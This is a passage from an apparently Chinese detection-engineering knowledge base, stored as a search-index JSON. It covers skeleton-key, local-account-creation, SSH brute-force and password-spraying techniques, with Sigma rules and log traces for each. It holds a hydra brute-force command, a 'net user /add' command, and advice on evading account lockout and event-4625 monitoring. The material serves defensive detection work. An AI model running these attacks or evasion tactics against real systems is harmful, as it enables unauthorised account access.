\u53ef\u7528\u5b57\u8282\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Windows \u4e07\u80fd\u5bc6\u7801\ndescription: Windows server 2008 R2\\win 7\nreferences: https://0xsp.com/ad-attack-or-defense/ad-ttps-list\ntags: T1098\nstatus: \u6d4b\u8bd5\u9636\u6bb5\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4673  #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1\n    selection2:\n        EventID: 4611  #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c\n    selection3:\n        EventID: 4688  #\u65b0\u8fdb\u7a0b\u521b\u5efa\n    selection4:\n        EventID: 4689  #\u9000\u51fa\u8fdb\u7a0b\n    condition: all of them\n    timeframe: last 5s\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_6","title":"\u5efa\u8bae","text":"<p>\u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1098</p> <p>https://attack.mitre.org/techniques/T1098/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;net user test321 Test.321 /add\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ndescription: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4\ntags:\n    - attack.t1098\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Eventid:\n            - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570\n            - 1    #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains|all: \n            - 'user'\n            - 'add'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legit user creation\n    - Better use event ids for user creation rather than command line rules\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_6","title":"\u5efa\u8bae","text":"<p>\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1098</p> <p>https://attack.mitre.org/techniques/T1098/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/","title":"T1110-003-linux-ssh\u7206\u7834","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5f53\u5bc6\u7801\u672a\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002\u653b\u51fb\u8005\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u4ee5\u53ca\u5e10\u6237\u9501\u5b9a\uff0c\u8d26\u6237\u9501\u5b9a\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u8bbe\u7f6e\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002</p> <p>\u901a\u5e38\uff0c\u53ef\u4ee5\u5bf9\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002\u5e38\u89c1linux\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>SSH\uff0822/TCP\uff09</li> <li>Telnet\uff0823/TCP\uff09</li> <li>FTP\uff0821/ TCP\uff09</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4ee5\u4e0b\u7ecf\u5178\u5de5\u5177\u53ef\u7528\u4e8e\u7aef\u53e3\u7206\u7834\uff1a</p> <ul> <li>Hydra</li> <li>Medusa</li> <li>Patator</li> <li>Brutepray</li> <li>\u2026\u2026</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux \u7cfb\u7edf\u65e5\u5fd7\uff08auth.log\uff09</p> <p>linux audit\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>root@icbc:/hacker/mima# hydra -l root -P passwd.txt  ssh://192.168.159.132 -V\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>auth.log</p> <pre><code>Failed password for root from 192.168.159.129 port 43728 ssh2\n</code></pre> <p>audit.log</p> <pre><code>type=USER_AUTH msg=audit(1572163129.581:316): pid=2165 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.159.129 addr=192.168.159.129 terminal=ssh res=failed'\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: linux\u4e0bssh\u66b4\u529b\u7834\u89e3\ndescription: Ubuntu18.04\u3001kali\nreferences:\ntags: T1110-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: linux\n    service: auth.log/audit.log\ndetection:\n    keywords:\n       - 'Failed password for * ssh2' #linux auth.log\n       - '* exe=\"/usr/sbin/sshd\" * terminal=ssh res=failed'  #linux audit.log\n    condition: keywords\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1110-003</p> <p>https://attack.mitre.org/techniques/T1110/003</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/","title":"T1110-003-windows-\u5bc6\u7801\u55b7\u5c04","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5f53\u5bc6\u7801\u672a\u77e5\u6216\u83b7\u5f97\u5bc6\u7801\u54c8\u5e0c\u503c\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u548c\u5e10\u6237\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002</p> <p>\u5bc6\u7801\u55b7\u5c04\u6280\u672f\u662f\u4f7f\u7528\u4e00\u4e2a\u5bc6\u7801\uff08\u4f8b\u5982\uff0c\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u7ec4\u5bc6\u7801\uff0c\u5176\u5339\u914d\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u5e76\u4e14\u53ef\u4ee5\u662f\u5e38\u7528\u5bc6\u7801\u3002\u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u7801\u7684\u4e0d\u540c\u8d26\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u7ec4\u7ec7\u5185\u7684\u7b56\u7565\u5bfc\u81f4\u8d26\u6237\u9501\u5b9a\u3002</p> <p>\u901a\u5e38\uff0c\u5728\u5bc6\u7801\u55b7\u5c04\u65f6\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u7ba1\u7406\u670d\u52a1\u3002\u901a\u7528\u76ee\u6807\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>SSH\uff0822/TCP\uff09</li> <li>Telnet\uff0823/TCP\uff09</li> <li>FTP\uff0821/ TCP\uff09</li> <li>NetBIOS/SMB/Samba\uff08139/TCP\u548c445/TCP\uff09</li> <li>LDAP\uff08389/TCP\uff09</li> <li>Kerberos\uff0888/TCP\uff09</li> <li>RDP /\u7ec8\u7aef\u670d\u52a1\uff083389/TCP\uff09</li> <li>HTTP / HTTP\u7ba1\u7406\u670d\u52a1\uff0880/TCP\u548c443/TCP\uff09</li> <li>MSSQL\uff081433/TCP\uff09</li> <li>Oracle\uff081521/TCP\uff09</li> <li>MySQL\uff083306/TCP\uff09</li> <li>VNC\uff085900/TCP\uff09</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#rdp","title":"RDP\u66b4\u529b\u7834\u89e3","text":"<p>\u8fdc\u7a0b\u684c\u9762\u534f\u8bae\uff08RDP, Remote Desktop Protocol\uff09\u662f\u4e00\u4e2a\u591a\u901a\u9053\uff08multi-channel\uff09\u7684\u534f\u8bae\uff0c\u8ba9\u7528\u6237\uff08\u5ba2\u6237\u7aef\u6216\u79f0\u201c\u672c\u5730\u7535\u8111\u201d\uff09\u8fde\u4e0a\u63d0\u4f9b\u5fae\u8f6f\u7ec8\u7aef\u673a\u670d\u52a1\u7684\u7535\u8111\uff08\u670d\u52a1\u5668\u7aef\u6216\u79f0\u201c\u8fdc\u7a0b\u7535\u8111\u201d\uff09\u3002\u5927\u90e8\u5206\u7684Windows\u90fd\u6709\u5ba2\u6237\u7aef\u6240\u9700\u8f6f\u4ef6\u3002\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u4e5f\u6709\u8fd9\u4e9b\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u4f8b\u5982Linux\u3001FreeBSD\u3001Mac OS X\u3002\u670d\u52a1\u7aef\u7535\u8111\u65b9\u9762\uff0c\u5219\u542c\u53d6\u9001\u5230TCP3389\u7aef\u53e3\u7684\u6570\u636e\u3002</p> <p>\u5f53\u7cfb\u7edf\u5bc6\u7801\u8bbe\u7f6e\u8f83\u4e3a\u7b80\u5355\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u679a\u4e3e\u8d26\u6237\u5bc6\u7801\u7684\u65b9\u6cd5\u8fdb\u884c\u7834\u89e3\u767b\u5f55\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_1","title":"\u5bc6\u7801\u55b7\u6d12\u653b\u51fb","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5f88\u591a\u65f6\u5019\u4eba\u4eec\u5bb9\u6613\u628a\u5bc6\u7801\u66b4\u529b\u7834\u89e3\u548c\u5bc6\u7801\u55b7\u5c04\u6280\u672f\u641e\u6df7\uff0c\u201c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u201d\uff08Password Spray Attack\uff09\u5e76\u4e0d\u7b49\u540c\u4e8e\u201c\u5bc6\u7801\u7206\u7834\u653b\u51fb\u201d\uff08Brute Force Attack\uff09\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u79cd\u653b\u51fb\u662f\u76f8\u53cd\u7684\u3002</p> <p>\u5728\u5bc6\u7801\u7206\u7834\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u9009\u62e9\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684 ID \u5e76\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u8f93\u5165\u5bc6\u7801\uff0c\u5e0c\u671b\u6709\u4e00\u4e9b\u5bc6\u7801\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u8fdb\u5165\u3002\u57fa\u672c\u4e0a\uff0c\u5bc6\u7801\u7206\u7834\u662f\u7528\u591a\u4e2a\u5bc6\u7801\u5c1d\u8bd5\u7834\u89e3\u540c\u4e00\u4e2a ID\u3002\u800c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u662f\u7528\u4e00\u4e2a\u5bc6\u7801\u6765\u5c1d\u8bd5\u591a\u4e2a\u7528\u6237 ID\uff0c\u4ee5\u4fbf\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237 ID \u88ab\u6cc4\u9732\u3002\u5bf9\u4e8e\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u9ed1\u5ba2\u4f7f\u7528\u793e\u4ea4\u5de5\u7a0b\u6216\u5176\u4ed6\u7f51\u7edc\u9493\u9c7c\u65b9\u6cd5\u6536\u96c6\u591a\u4e2a\u7528\u6237 ID\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u7b80\u5355\u7684\u5bc6\u7801\uff0c\u598212345678\u751a\u81f3\u662f p@ssw0rd\u3002</p> <p>\u5728\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4e2d\uff0c\u9ed1\u5ba2\u4f1a\u4e3a\u5176\u6536\u96c6\u7684\u6240\u6709\u7528\u6237 ID \u7cbe\u5fc3\u6784\u9020\u5bc6\u7801\u3002\u56e0\u6b64\uff0c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u5c06\u76f8\u540c\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u7ec4\u7ec7\u4e2d\u7684\u591a\u4e2a\u7528\u6237\u5e10\u6237\uff0c\u76ee\u7684\u662f\u5b89\u5168\u7684\u5bf9\u5176\u4e2d\u4e00\u4e2a\u5e10\u6237\u8fdb\u884c\u672a\u6388\u6743\u8bbf\u95ee\u3002</p> <p>\u66b4\u529b\u7834\u89e3\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5728\u4f7f\u7528\u4e0d\u540c\u5bc6\u7801\u8fdb\u884c\u4e00\u5b9a\u6b21\u6570\u7684\u5c1d\u8bd5\u540e\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u88ab\u9501\u5b9a\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u4ea7\u751f\u4e86\u6536\u96c6\u7528\u6237 ID \u5e76\u5c06\u53ef\u80fd\u7684\u5bc6\u7801\u5e94\u7528\u4e8e\u5b83\u4eec\u7684\u60f3\u6cd5\u3002\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u65f6\uff0c\u9ed1\u5ba2\u4e5f\u4f1a\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4ed6\u4eec\u5c1d\u8bd5\u5c06 password1\u5e94\u7528\u4e8e\u6240\u6709\u7528\u6237\u5e10\u6237\uff0c\u5219\u5728\u5b8c\u6210\u7b2c\u4e00\u8f6e\u540e\uff0c\u4ed6\u4eec\u4e0d\u4f1a\u7acb\u5373\u5f00\u59cb\u5c06 password2\u5e94\u7528\u4e8e\u8fd9\u4e9b\u5e10\u6237\u3002\u4ed6\u4eec\u5c06\u5728\u9ed1\u5ba2\u653b\u51fb\u4e2d\u7559\u51fa\u81f3\u5c1130\u5206\u949f\u7684\u65f6\u95f4\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_2","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4ec5\u6587\u5b57\u63cf\u8ff0</p> <p>\u7531\u4e8eAD\u7528\u6237\u8bbe\u7f6e\u9501\u5b9a\u9608\u503c\u4e3a5\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u7528\u6237\u5c1d\u8bd54\u4e2a\u4e0d\u540c\u7684\u5bc6\u7801\uff0c\u7136\u540e\u6211\u4eec\u7b49\u5f8530\u5206\u949f\u6216\u8005\u6bd430\u5206\u949f\u66f4\u957f\u7684\u65f6\u95f4\uff08\u9501\u5b9a\u7a97\u53e3\uff0c\u5176\u4e2dDC\u4fdd\u6301\u9501\u5b9a\u8ba1\u6570\uff0c\u6b64\u540e\u91cd\u7f6e\u4e3a0\uff09\uff0c\u7136\u540e\u518d\u8bd5\u4e00\u6b21\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u6709\u5173AD\u57df\u73af\u5883\u7684\u5bc6\u7801\u7b56\u7565\u4fe1\u606f\uff0c\u5e2e\u52a9\u653b\u51fb\u8005\u80fd\u591f\u66f4\u597d\u5730\u4f7f\u7528\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002</p> <p>\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u901a\u5e38\u5e94\u7528\u5230SMB\u5171\u4eab\u6216RDP\u670d\u52a1\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4ece\u8fd9\u4e24\u70b9\u5165\u624b\uff0c\u8fd9\u4e24\u7c7b\u670d\u52a1\u5728\u4f01\u4e1a\u5185\u7f51\u4e2d\u662f\u975e\u5e38\u5e38\u89c1\u7684\u3002\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u4f1a\u4ea7\u751f\u5927\u91cf\u7684windows\u4e8b\u4ef6ID 4625\u767b\u5f55\u5931\u8d25\u3002\u5f53\u53d1\u73b0\u5927\u91cf\u6b64\u7c7b\u4e8b\u4ef6\u65f6\uff0c\u5b83\u503c\u5f97\u5f15\u8d77\u4f60\u7684\u6ce8\u610f\u3002</p> <p>\u5f53\u653b\u51fb\u8005\u901a\u8fc7\u66f4\u6539\u8fde\u63a5\u7684\u670d\u52a1\u6765\u907f\u514dwindows\u4ea7\u751f\u4e8b\u4ef6ID4625\uff0c\u5373\u4e0d\u518d\u8fde\u63a5SMB\u6216\u8005RDP\u670d\u52a1\uff0c\u800c\u662f\u8fde\u63a5\u5230\u57df\u63a7\u5236\u5668\u4e0a\u7684LDAP\u670d\u52a1\uff0c\u8bb8\u591a\u7ec4\u7ec7\u90fd\u5728\u96c6\u4e2d\u7cbe\u529b\u53bb\u76d1\u89c64625\u4e8b\u4ef6\u3002\u4f46\u5982\u679c\u8fde\u63a5\u5230LDAP\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4e0d\u4f1a\u8bb0\u5f554625\u4e8b\u4ef6\u3002\u5219\u4f1a\u8bb0\u5f55Kerberos\u65e5\u5fd7\u4e8b\u4ef64771\uff0c\u5e76\u76d1\u6d4b\u201cKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u201d\u3002\u5728\u4e8b\u4ef6ID 4771\u4e2d\uff0c\u5931\u8d25\u4ee3\u7801\u4e3a\u201c0x18\u201d,\u8fd9\u610f\u5473\u7740\u5bc6\u7801\u9519\u8bef\u3002</p> <p>\u5728\u63a5\u5165\u57df\u7684\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u5bc6\u7801\u55b7\u5c04\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u5728\u6b64\u7cfb\u7edf\u4e0a\uff08\u5373\u57df\u5185\u4efb\u610f\u4e3b\u673a\u7cfb\u7edf\uff09\u8fd0\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u5219\u4f1a\u5728\u6b64\u4e3b\u673a\u4e0a\u8bb0\u5f55\u4e8b\u4ef6ID4648\uff08\u201c\u4f7f\u7528\u663e\u5f0f\u51ed\u636e\u5c1d\u8bd5\u767b\u5f55\u201d\uff09\u3002\u5982\u679c\u5728\u51e0\u79d2\u949f\u5185\u8bb0\u5f55\u4e86\u5927\u91cf4648\u4e8b\u4ef6\uff0c\u8fd9\u79cd\u60c5\u51b5\u662f\u5f02\u5e38\u7684\uff0c\u4f60\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u5728AD\u73af\u5883\u4e2d\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u542f\u7528\u9002\u5f53\u7684\u65e5\u5fd7\u8bb0\u5f55\u548c\u6709\u6548\u7684\u5173\u8054\u6765\u8fdb\u884c\u68c0\u6d4b\u548c\u53d1\u73b0\u3002</p> <p>\u4e3b\u8981\u7684\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff1a</p> <ul> <li>\u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4625 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09</li> <li>\u57df\u63a7\u5236\u5668\uff1a\u4e8b\u4ef6ID4771 \u5ba1\u6838Kerberos\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1 \uff08\u6210\u529f\u548c\u5931\u8d25\uff09</li> <li>\u6240\u6709\u7cfb\u7edf\uff1a\u4e8b\u4ef6ID4648 \u5ba1\u6838\u767b\u5f55\uff08\u6210\u529f\u548c\u5931\u8d25\uff09</li> 